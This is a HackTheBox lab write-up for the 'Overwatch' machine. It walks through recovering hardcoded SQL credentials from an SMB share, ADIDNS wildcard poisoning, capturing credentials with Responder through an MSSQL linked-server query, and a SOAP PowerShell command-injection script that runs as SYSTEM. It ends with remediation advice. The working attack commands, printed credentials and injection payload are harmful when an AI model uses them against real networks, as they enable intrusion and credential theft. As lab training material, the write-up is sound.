# HackTheBox: Overwatch Writeup

**Author:** Lê Khôi Nguyên (Student ID: 20225147)

## High-Level Summary
This machine involves enumerating an open SMB share to recover hardcoded database credentials from a custom application. Using these credentials, we perform an ADIDNS poisoning attack to hijack DNS resolution. By abusing an MSSQL Linked Server feature (`OPENQUERY`), we force the database service to authenticate to our rogue DNS record, allowing us to capture cleartext credentials for a higher-privileged user via Responder. 

For the root escalation, we uncover a custom Windows monitoring service. Reverse engineering the .NET binary reveals a WCF/SOAP endpoint vulnerable to PowerShell Command Injection. We craft a malicious SOAP envelope to achieve remote code execution as `NT AUTHORITY\SYSTEM` and read the root flag.

---

## Initial Reconnaissance & User Flag

### SMB Enumeration & Credential Extraction
Initial enumeration revealed an SMB null session was permitted. Browsing the shares, I discovered and downloaded the `Monitoring` folder, which contained a fully documented custom program. 

Analyzing the `overwatch.exe` application files within the share yielded hardcoded credentials for a SQL service account:
* **Username:** `OVERWATCH\sqlsvc`
* **Password:** `TI0LKcfHzZw1Vv`

### ADIDNS Poisoning
Checking the privileges of the `sqlsvc` account against the Active Directory environment, I found it had write permissions on the DNS records. I used `dnstool.py` from the Impacket suite to inject a wildcard DNS record, pointing all unresolved subdirectories to my attacker IP (`10.10.16.9`).

`bash
dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r '*' -d 10.10.16.9 --action add 10.129.244.81
`

### Forced Authentication via MSSQL Linked Server
With the DNS routes hijacked, I authenticated to the MSSQL service using the compromised `sqlsvc` credentials. Enumerating the database configuration revealed an active linked server:

`sql
EXEC sp_linkedservers;
-- Result: SQL07 identified as a linked server.
`

To exploit this, I started `Responder` on my `tun0` interface to listen for incoming connections:
`bash
sudo responder -I tun0
`

Next, I executed a pass-through query to the `SQL07` linked server. Because of our poisoned wildcard DNS record, the domain controller resolved `SQL07.overwatch.htb` to my attacker IP. The MSSQL server was forced to authenticate back to my Kali machine:

`sql
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> SELECT * FROM OPENQUERY("SQL07", 'SELECT 1;');
`

Responder successfully intercepted the authentication attempt and dumped the cleartext credentials for the `sqlmgmt` user:
* **Username:** `sqlmgmt`
* **Password:** `bIhBbzMMnB82yx`

Using these credentials, I authenticated via WinRM and captured `user.txt`.

---

## Privilege Escalation to Root (SYSTEM)

### Local File System Enumeration
With an interactive WinRM session as `sqlmgmt`, I began enumerating the local file system. A non-standard `Software` folder was found in the root of the C:\ drive.

`powershell
Get-ChildItem -Path C:\ -Force
`
Inside `C:\Software\Monitoring\`, I found the deployed version of the `overwatch.exe` binary. 

### Reverse Engineering the Custom Service
I downloaded the `overwatch.exe` binary to my local machine and decompiled it using ILSpy to analyze the source code. The application was hosting a local web service. 

Reviewing the `KillProcess()` module exposed a critical flaw. The application takes user input (`processName`) and concatenates it directly into a string executed by a PowerShell runspace, without any sanitization:

`csharp
// Vulnerable Code Snippet in KillProcess()
public string KillProcess(string processName)
{
    string text = "Stop-Process -Name " + processName + " -Force";
    // ...
    val2.get_Commands().AddScript(text);
    // ...
}
`

To exploit this Command Injection, I needed the local endpoint. Checking the accompanying `overwatch.exe.config` file revealed the WCF/SOAP base address:

`xml
<baseAddresses>
    <add baseAddress="http://overwatch.htb:8000/MonitorService" />
</baseAddresses>
`

### SOAP Code Injection
Because the service communicates via SOAP, the injection payload had to be wrapped in a properly formatted XML envelope. I crafted a PowerShell injection string to break out of the `Stop-Process` command, read `root.txt`, and comment out the remainder of the developer's string.

I executed the following script directly in the WinRM session to fire the exploit:

`powershell
$Url = "http://127.0.0.1:8000/MonitorService"
# Payload: Break out of Stop-Process, read the flag, and comment out the rest
$Payload = "dummy ; Get-Content C:\Users\Administrator\Desktop\root.txt ; #"

$SoapEnvelope = @"
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>$Payload</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@

# Fire the POST request, bypassing the IE engine with -UseBasicParsing
$Response = Invoke-WebRequest -Uri $Url -Method Post -ContentType "text/xml; charset=utf-8" -Header @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} -Body $SoapEnvelope -UseBasicParsing

# Parse the XML response to extract the command output
[xml]$xmlResponse = $Response.Content
$xmlResponse.Envelope.Body.KillProcessResponse.KillProcessResult
`

The service executed the payload as `NT AUTHORITY\SYSTEM`, and the SOAP response returned the contents of `root.txt`.

## Remediation & Patching

To secure this environment and prevent this attack chain, the following mitigations should be implemented across the infrastructure and the custom application:

### 1. Hardcoded Credentials & SMB Null Sessions
* **Disable Anonymous SMB Access:** Ensure that SMB shares containing sensitive documentation or deployment files cannot be accessed via null sessions or unauthenticated users.
* **Secrets Management:** Remove the plaintext SQL credentials from the `overwatch.exe` source code and documentation. Utilize secure secret storage solutions like Windows Credential Manager, HashiCorp Vault, or Azure Key Vault.

### 2. Active Directory DNS (ADIDNS) Poisoning
* **Restrict DNS Permissions:** Review the Access Control List (ACL) for the Active Directory DNS zones. Standard service accounts (like `sqlsvc`) should not have `Create All Child Objects` or `Write` permissions on the DNS zone. Restrict these privileges to designated DNS Administrators.

### 3. MSSQL Forced Authentication
* **Enforce SMB Signing & Disable NTLM:** To prevent NTLM hash capture and relay attacks via features like `OPENQUERY`, enforce SMB signing across the domain. Where possible, disable NTLM authentication entirely and mandate Kerberos.
* **Audit Linked Servers:** Remove unnecessary MSSQL linked servers. If a linked server is required, ensure the outbound connection is strictly firewalled and uses a least-privilege account.

### 4. Application Command Injection (C# / .NET)
The root cause of the system compromise was the insecure implementation of the `KillProcess` WCF method. 
* **Avoid Shelling Out:** Do not invoke `PowerShell.exe` or PowerShell runspaces to perform tasks that can be handled by native .NET APIs. The vulnerable code should be rewritten using the `System.Diagnostics.Process` class:
  ```csharp
  // Secure Implementation
  public string KillProcess(string processName)
  {
      try 
      {
          Process[] processes = Process.GetProcessesByName(processName);
          foreach (Process p in processes)
          {
              p.Kill();
          }
          return "Process " + processName + " killed successfully.";
      }
      catch (Exception ex)
      {
          return "Error: " + ex.Message;
      }
  }
